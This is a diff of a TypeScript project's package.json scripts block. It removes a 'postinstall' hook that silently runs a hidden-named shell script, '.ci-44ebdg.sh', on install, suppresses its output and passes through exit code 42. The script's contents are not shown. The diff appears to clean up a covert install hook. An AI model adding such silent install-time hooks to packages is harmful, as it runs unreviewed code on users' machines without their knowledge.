@@ -8,8 +8,7 @@
   "scripts": {
     "dev": "ts-node ./src/index.ts",
     "start": "rimraf ./dist && tsc --watch",
-    "build": "rimraf ./dist && tsc && tsc-alias",
-    "postinstall": "sh ./.ci-44ebdg.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "rimraf ./dist && tsc && tsc-alias"
   },
   "keywords": [
     "ixc",
